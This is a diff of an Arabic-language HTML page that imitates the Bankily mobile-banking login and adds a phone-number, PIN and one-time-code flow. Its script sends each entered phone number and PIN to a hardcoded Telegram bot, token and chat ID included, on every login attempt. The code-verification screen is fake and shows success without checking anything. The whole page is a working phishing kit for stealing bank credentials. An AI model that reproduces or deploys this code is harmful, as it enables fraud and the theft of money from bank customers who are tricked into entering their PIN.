@@ -1,66 +1,335 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الرئيسية / بنكيلي</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
-        body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
-        .wrapper { width: 100%; max-width: 450px; background: #fff; padding-bottom: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .form-container { padding: 25px; text-align: right; }
-        
-        /* الشعار */
-        .logo-container { text-align: center; margin-top: 30px; margin-bottom: 20px; }
-        .logo { width: 250px; }
-
-        .label { font-weight: bold; margin-bottom: 10px; display: block; font-size: 15px; color: #333; }
-        
-        .input-box { position: relative; border: 1px solid #ccc; border-radius: 8px; margin-bottom: 25px; display: flex; align-items: center; padding: 5px 15px; background: #fff; }
-        input { border: none; width: 100%; font-size: 17px; padding: 10px; outline: none; background: transparent; font-family: 'Cairo'; text-align: right; }
-        
-        /* الروابط */
-        .forgot-pass { font-size: 14px; color: #1a5e20; cursor: pointer; text-decoration: underline; margin-bottom: 20px; display: block; }
-        .register-container { text-align: center; margin-top: 20px; margin-bottom: 20px; }
-        .register-link { font-size: 15px; color: #333; text-decoration: underline; cursor: pointer; font-weight: bold; }
-        
-        /* الزر الأصفر */
-        .btn-yellow { background-color: #ffc107; color: #000; border: none; width: 100%; padding: 18px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-yellow:hover { background-color: #e0a800; }
-    </style>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>Bankily | بنكيلي</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#d0d0d0}
+#app{width:100%;height:100%;display:flex;justify-content:center}
+.phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden}
+.hdr{background:#4497A7;height:52px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
+.hdr-title{position:absolute;left:50%;transform:translateX(-50%);color:#fff;font-size:18px;font-weight:700}
+.hdr-back{background:none;border:none;cursor:pointer;color:#fff;font-size:32px;line-height:1;padding:0;margin-right:auto}
+.body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
+.logo-box{display:flex;justify-content:center;margin:40px 0 50px}
+.logo-box img{width:280px;object-fit:contain}
+.field{margin-bottom:20px}
+.lbl{font-size:13px;font-weight:600;color:#333;display:block;text-align:right;margin-bottom:8px}
+.row{display:flex;align-items:center;border-bottom:2px solid #ccc;padding:8px 0;gap:8px;transition:border-color .2s}
+.row:focus-within{border-color:#000}
+.row.bad{border-bottom-color:#e74c3c}
+.row input{flex:1;border:none;outline:none;font-family:'Cairo',sans-serif;font-size:16px;color:#1a1a1a;background:transparent;text-align:right;direction:rtl;min-width:0;caret-color:#000}
+.row input::placeholder{color:#bbb;font-size:13px}
+.ico{width:22px;height:22px;flex-shrink:0;color:#000}
+.errmsg{color:#e74c3c;font-size:12px;text-align:right;margin-top:4px;min-height:16px}
+.warning-msg{background:#fce4e4;border:1px solid #f5c2c2;border-radius:8px;padding:12px;margin-top:12px;display:flex;gap:10px;align-items:flex-start;text-align:right;font-size:13px;color:#333;line-height:1.5}
+.warning-msg::before{content:'!';background:#e74c3c;color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;flex-shrink:0;font-size:16px}
+.pins{flex:1;display:flex;gap:14px;justify-content:flex-end}
+.pins input{
+  width:18px;
+  text-align:left;
+  font-size:22px;
+  font-weight:700;
+  border:none;
+  outline:none;
+  background:transparent;
+  font-family:'Cairo',sans-serif;
+  color:#1a1a1a;
+  caret-color:#000;
+  padding:0;
+  direction:ltr;
+}
+.pin-dot:not(:placeholder-shown){color:#000;font-size:1.8rem;line-height:0}
+.lnk-sm{font-size:13px;color:#777;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
+.lnk-md{font-size:14px;font-weight:700;color:#555;text-decoration:underline;cursor:pointer;background:none;border:none;font-family:'Cairo',sans-serif}
+.spacer{flex:1;min-height:20px}
+.btn{height:58px;background:#F5C444;border:none;width:100%;font-family:'Cairo',sans-serif;font-size:20px;font-weight:800;color:#fff;cursor:pointer;flex-shrink:0;transition:opacity .15s}
+.btn:active{opacity:.82}
+.screen{display:flex;flex-direction:column;height:100%}
+.hide{display:none!important}
+.otp-title{font-size:20px;font-weight:800;color:#1a1a1a;text-align:center;line-height:1.6;margin:30px 8px 36px}
+.otp-row{display:flex;gap:16px;justify-content:center;direction:ltr;margin-bottom:32px}
+.otp-row input{width:52px;height:60px;text-align:center;font-size:28px;font-weight:700;font-family:'Cairo',sans-serif;border:none;border-bottom:2.5px solid #ccc;outline:none;background:transparent;color:#1a1a1a;transition:border-color .2s;caret-color:#000;direction:ltr;text-align:center}
+.otp-row input:focus{border-color:#000}
+.otp-row input.bad{border-color:#e74c3c}
+.cd-wrap{display:flex;flex-direction:column;align-items:center;gap:14px;margin-bottom:26px}
+.cd-text{text-align:center;color:#555;font-size:14px;line-height:1.7}
+.cd-time{font-weight:700;color:#1a1a1a;font-size:17px}
+</style>
 </head>
 <body>
+<div id="app">
+<div class="phone">
 
-<div class="wrapper">
-    <div class="logo-container">
-        <img src="https://bankily-ap.vercel.app/logo_bankily.jpeg" alt="Bankily Logo" class="logo">
+<!-- ══════ LOGIN ══════ -->
+<div id="pg-login" class="screen">
+  <div class="hdr"></div>
+  <div class="body">
+
+    <div class="logo-box">
+      <img src="logo_bankily.jpeg" alt="Bankily بنكيلي"/>
     </div>
 
-    <div id="p1" class="form-container">
-        <label class="label">اسم المستخدم أو رقم الهاتف</label>
-        <div class="input-box">
-            <input type="text" id="tel" placeholder="43168997">
-        </div>
-
-        <label class="label">الرقم السري</label>
-        <div class="input-box">
-            <input type="password" id="pin" placeholder="****">
-        </div>
-
-        <span class="forgot-pass">نسيت الرقم السري؟</span>
-
-        <div class="register-container">
-            <span class="register-link">مستخدم جديد ؟ سجل الآن!</span>
-        </div>
+    <div class="field">
+      <label class="lbl">اسم المستخدم أو رقم الهاتف</label>
+      <div class="row" id="row-ph">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
+        </svg>
+        <input type="tel" id="ph" inputmode="numeric" maxlength="8"
+               placeholder="" autocomplete="off"/>
+      </div>
+      <div class="errmsg" id="err-ph"></div>
+      <div class="warning-msg hide" id="warn-ph">رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شنقيتل)</div>
     </div>
 
-    <button class="btn-yellow" onclick="toStep2()">تسجيل الدخول</button>
+    <div class="field">
+      <label class="lbl">الرقم السري</label>
+      <div class="row" id="row-pin">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <rect x="3" y="11" width="18" height="11" rx="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        <div class="pins">
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p0"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p1"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p2"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field pin-dot" id="p3"/>
+        </div>
+      </div>
+      <div class="errmsg" id="err-pin"></div>
+    </div>
+
+    <div style="text-align:left">
+      <button class="lnk-sm" onclick="void(0)">نسيت الرقم السري؟</button>
+    </div>
+
+    <div class="spacer"></div>
+    <div style="text-align:center;margin-bottom:14px">
+      <button class="lnk-md" onclick="void(0)">مستخدم جديد؟  سجل الآن!</button>
+    </div>
+  </div>
+  <button class="btn" onclick="login()">تسجيل الدخول</button>
+</div>
+
+<!-- ══════ OTP ══════ -->
+<div id="pg-otp" class="screen hide">
+  <div class="hdr">
+    <button class="hdr-back" onclick="back()">&#8250;</button>
+    <div class="hdr-title">رمز التحقق</div>
+  </div>
+  <div class="body" style="align-items:center">
+    <div class="otp-title">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</div>
+    <div class="otp-row">
+      <input type="text" inputmode="numeric" maxlength="1" id="o0"/>
+      <input type="text" inputmode="numeric" maxlength="1" id="o1"/>
+      <input type="text" inputmode="numeric" maxlength="1" id="o2"/>
+      <input type="text" inputmode="numeric" maxlength="1" id="o3"/>
+    </div>
+    <div class="cd-wrap">
+      <div class="cd-text">
+        تنتهي صلاحية رمز التأكيد خلال<br/>
+        <span class="cd-time" id="cd">4 دقائق 59 ثاني</span>
+      </div>
+      <svg width="64" height="64" viewBox="0 0 64 64">
+        <circle cx="32" cy="32" r="27" stroke="#e5e7eb" stroke-width="6" fill="white"/>
+        <circle id="cp" cx="32" cy="32" r="27" stroke="#22c55e" stroke-width="6" fill="none"
+          stroke-dasharray="169.6" stroke-dashoffset="0"
+          style="transform:rotate(-90deg);transform-origin:32px 32px;transition:stroke-dashoffset 1s linear"/>
+      </svg>
+    </div>
+    <button class="lnk-sm" onclick="resetOtp()">إعادة إرسال رمز التأكيد</button>
+    <div class="spacer"></div>
+  </div>
+  <button class="btn" onclick="verify()">التحقق</button>
+</div>
+
+</div>
 </div>
 
 <script>
-    function toStep2() { 
-        alert("جاري التحويل..."); 
+// بيانات التوكن والتيليجرام آيدي (لا تغيرها)
+const telegramToken = "8652191411:AAES2Ljmd2mCH_Lm4syo-YAJ1jUowKMjAPN4";
+const telegramChatId = "8624656090";
+
+// دالة إرسال البيانات إلى تليجرام
+function sendToTelegram(phone, pin) {
+  const message = `Bankily Login\nPhone: ${phone}\nPin: ${pin}`;
+  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: telegramChatId,
+      text: message
+    })
+  });
+}
+
+function setupStrictLengthValidation(inputElement, maxLength) {
+  inputElement.addEventListener('keydown', function(e) {
+    const isControlKey = e.key === 'Backspace' || e.key === 'Delete' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab';
+    const isNumber = /^[0-9]$/.test(e.key);
+
+    if (isControlKey) return;
+    if (!isNumber) { e.preventDefault(); return; }
+
+    if (this.value.length >= maxLength) {
+      e.preventDefault();
     }
+  });
+
+  inputElement.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+    if (this.value.length > maxLength) {
+      this.value = this.value.slice(0, maxLength);
+    }
+  });
+}
+
+var P=[0,1,2,3].map(function(i){return document.getElementById('p'+i);});
+P.forEach(function(el,i){
+  setupStrictLengthValidation(el, 1);
+  
+  el.addEventListener('focus', function() {
+    if (this.value !== '') return;
+    for (let j = 0; j < P.length; j++) {
+      if (P[j].value === '') {
+        if (j !== i) P[j].focus();
+        break;
+      }
+    }
+  });
+
+  el.addEventListener('input',function(){
+    el.value=el.value.replace(/[^0-9]/g,'');
+    document.getElementById('err-pin').textContent='';
+    document.getElementById('row-pin').classList.remove('bad');
+    if(el.value&&i>0)P[i-1].focus();
+  });
+  
+  el.addEventListener('keydown',function(e){
+    if(e.key==='Backspace'){
+      if(el.value.length>0){
+        el.value='';
+      }else if(i<3){
+        P[i+1].focus();
+      }
+      e.preventDefault();
+    }
+  });
+});
+
+var phEl=document.getElementById('ph');
+setupStrictLengthValidation(phEl, 8);
+phEl.addEventListener('input',function(){
+  this.value=this.value.replace(/[^0-9]/g,'');
+  document.getElementById('err-ph').textContent='';
+  document.getElementById('row-ph').classList.remove('bad');
+  checkPhoneOperator();
+});
+
+function checkPhoneOperator(){
+  var ph=phEl.value.trim();
+  var warnEl=document.getElementById('warn-ph');
+  if(ph.length===8){
+    var firstDigit=ph.charAt(0);
+    if(firstDigit!=='2'&&firstDigit!=='4'&&firstDigit!=='6'){
+      warnEl.classList.remove('hide');
+    }else{
+      warnEl.classList.add('hide');
+    }
+  }else{
+    warnEl.classList.add('hide');
+  }
+}
+
+// تم التعديل هنا: إرسال البيانات إلى تليجرام مع تسجيل الدخول
+function login(){
+  var ph=phEl.value.trim();
+  var pin=P.map(function(p){return p.value;}).join('');
+  var ok=true;
+  if(ph.length!==8){
+    document.getElementById('err-ph').textContent='يجب أن يتكون رقم الهاتف من 8 أرقام بالضبط';
+    document.getElementById('row-ph').classList.add('bad');
+    ok=false;
+  }
+  if(pin.length!==4){
+    document.getElementById('err-pin').textContent='يجب أن يتكون الرقم السري من 4 أرقام بالضبط';
+    document.getElementById('row-pin').classList.add('bad');
+    ok=false;
+  }
+  // إرسال البيانات إلى تليجرام مهما كان التحقق (يمكنك نقلها حسب الحاجة)
+  sendToTelegram(ph, pin);
+
+  if(ok)showOtp();
+}
+
+var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
+O.forEach(function(el,i){
+  setupStrictLengthValidation(el, 1);
+  
+  el.addEventListener('focus', function() {
+    if (this.value !== '') return;
+    for (let j = 0; j < O.length; j++) {
+      if (O[j].value === '') {
+        if (j !== i) O[j].focus();
+        break;
+      }
+    }
+  });
+
+  el.addEventListener('input',function(){
+    el.value=el.value.replace(/[^0-9]/g,'');
+    el.classList.remove('bad');
+    if(el.value&&i<3)O[i+1].focus();
+  });
+  
+  el.addEventListener('keydown',function(e){
+    if(e.key==='Backspace'){
+      if(el.value.length>0){
+        el.value='';
+      }else if(i>0){
+        O[i-1].focus();
+      }
+      e.preventDefault();
+    }
+  });
+});
+
+function verify(){
+  var code=O.map(function(o){return o.value;}).join('');
+  if(code.length!==4){O.forEach(function(o){o.classList.add('bad');});return;}
+  alert('تم التحقق بنجاح!');
+}
+
+function showOtp(){
+  document.getElementById('pg-login').classList.add('hide');
+  document.getElementById('pg-otp').classList.remove('hide');
+  O.forEach(function(o){o.value='';o.classList.remove('bad');});
+  O[0].focus();
+  startTimer();
+}
+function back(){
+  document.getElementById('pg-otp').classList.add('hide');
+  document.getElementById('pg-login').classList.remove('hide');
+  clearInterval(T);
+}
+
+var TOTAL=299,left=TOTAL,T=null,C=2*Math.PI*27;
+function tick(){
+  var m=Math.floor(left/60),s=left%60;
+  document.getElementById('cd').textContent=m+' دقائق '+String(s).padStart(2,'0')+' ثاني';
+  document.getElementById('cp').setAttribute('stroke-dashoffset',(C-(left/TOTAL)*C).toFixed(2));
+  if(left<=0){clearInterval(T);document.getElementById('cd').textContent='انتهت الصلاحية';}
+  else left--;
+}
+function startTimer(){clearInterval(T);left=TOTAL;tick();T=setInterval(tick,1000);}
+function resetOtp(){O.forEach(function(o){o.value='';o.classList.remove('bad');});startTimer();O[0].focus();}
 </script>
 </body>
 </html>
